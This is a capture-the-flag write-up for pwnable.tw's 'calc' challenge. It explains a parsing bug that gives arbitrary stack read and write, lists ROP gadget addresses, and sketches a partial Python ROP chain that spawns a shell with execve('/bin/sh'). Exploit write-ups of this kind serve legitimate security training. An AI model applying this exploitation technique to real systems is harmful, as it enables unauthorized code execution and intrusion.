# calc - pwnable.tw [150 pts]

## Challenge

> Have you ever use Microsoft calculator?
>
> `nc chall.pwnable.tw 10100`

A 32-bit statically linked ELF binary implementing a simple calculator.

## Binary Analysis

```
$ file calc
calc: ELF 32-bit LSB executable, Intel 80386, version 1 (GNU/Linux), statically linked

$ checksec calc
Arch:     i386-32-little
RELRO:    Partial RELRO
Stack:    Canary found
NX:       NX enabled
PIE:      No PIE
```

Key protections:
- **Stack Canary**: Present but can be bypassed
- **NX**: Enabled, requires ROP
- **Statically Linked**: All gadgets available in binary

## Reverse Engineering

### Main Loop (`calc` function at 0x8049379)

```c
void calc() {
    char expr[0x400];     // at ebp-0x40c
    int pool[0x64];       // at ebp-0x5a0 (100 integers + counter)

    while (get_expr(expr, 0x400)) {
        init_pool(pool);  // pool[0]=0, pool[1..100]=0
        if (parse_expr(expr, pool)) {
            printf("%d\n", pool[pool[0]]);  // Print result
        }
    }
}
```

### Expression Parsing (`parse_expr` at 0x804902a)

The parser processes mathematical expressions with operators `+`, `-`, `*`, `/`:

1. Collects digit sequences to form numbers
2. Calls `atoi()` on number strings
3. **Only pushes values > 0 to the pool** (key vulnerability!)
4. Calls `eval()` when encountering operators

### Evaluation (`eval` at 0x8048ee1)

```c
void eval(int *pool, char op) {
    // pool[0] is the stack pointer (number of elements)
    // Performs: pool[pool[0]-1] = pool[pool[0]-1] op pool[pool[0]]
    switch(op) {
        case '+': pool[pool[0]-1] += pool[pool[0]]; break;
        case '-': pool[pool[0]-1] -= pool[pool[0]]; break;
        case '*': pool[pool[0]-1] *= pool[pool[0]]; break;
        case '/': pool[pool[0]-1] /= pool[pool[0]]; break;
    }
    pool[0]--;  // Pop one operand
}
```

## Vulnerability

When parsing an expression starting with an operator like `+N`:

1. The `+` is seen first (not a digit), so `atoi("")` is called on the empty prefix
2. `atoi("")` returns **0**, which is **NOT pushed** (since 0 <= 0)
3. `N` is pushed: `pool[0]=1`, `pool[1]=N`
4. At end of expression, `eval('+')` is called:
   - `pool[pool[0]-1] = pool[pool[0]-1] + pool[pool[0]]`
   - `pool[0] = pool[0] + pool[1] = 1 + N`
   - `pool[0]--` → `pool[0] = N`
5. Result printed: `pool[pool[0]] = pool[N]` → **Arbitrary Read!**

Similarly, `+N+V` allows modifying `pool[N]`:
- After step 4: `pool[0] = N`
- Push `V`: `pool[0] = N+1`, `pool[N+1] = V`
- `eval('+')`: `pool[N] = pool[N] + pool[N+1] = pool[N] + V`
- **Arbitrary Write!**

### Stack Layout

```
pool[0]    @ ebp - 0x5a0  (counter)
pool[1]    @ ebp - 0x59c
...
pool[357]  @ ebp - 0x0c   (stack canary - DON'T TOUCH!)
...
pool[360]  @ ebp          (saved ebp)
pool[361]  @ ebp + 0x04   (return address)
pool[362]  @ ebp + 0x08   (start of ROP chain)
```

**Key Insight**: We can write to `pool[361]` (return address) without touching `pool[357]` (canary)!

## Exploitation Strategy

Since NX is enabled, we need ROP. The binary is statically linked, providing many gadgets.

### ROP Chain

Goal: Execute `execve("/bin/sh", NULL, NULL)`

1. Write `"/bin/sh\0"` to `.bss` (0x080ecf80) using `mov [edx], eax; ret` gadget
2. Set up registers: `eax=11`, `ebx=/bin/sh ptr`, `ecx=0`, `edx=0`
3. Trigger `int 0x80`

### Gadgets Used

| Address | Gadget |
|---------|--------|
| 0x0805c34b | `pop eax; ret` |
| 0x080481d1 | `pop ebx; ret` |
| 0x080701aa | `pop edx; ret` |
| 0x080701d1 | `pop ecx; pop ebx; ret` |
| 0x0809b30d | `mov [edx], eax; ret` |
| 0x08049a21 | `int 0x80` |

### Writing Values

For each stack slot we need to modify:
1. Read current value: `+N` → prints `pool[N]`
2. Calculate delta: `delta = target - current`
3. Write new value:
   - If `delta > 0`: send `+N+delta`
   - If `delta < 0`: send `+N-abs(delta)`

## Solution

```python
# Write ROP chain starting at pool[361] (return address)
rop_chain = [
    0x080701aa,  # pop edx; ret
    0x080ecf80,  # .bss address
    0x0805c34b,  # pop eax; ret
    0x6e69622f,  # "/bin"
    0x0809b30d,  # mov [edx], eax; ret
    # ... write "/sh\0" to .bss+4 ...
    # ... set up execve args ...
    0x08049a21,  # int 0x80
]

for i, gadget in enumerate(rop_chain):
    write_value(361 + i, gadget)

# Send empty line to exit loop and trigger return
```

See `exploit.py` for full implementation.

## Flag

```
FLAG{xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx}
```
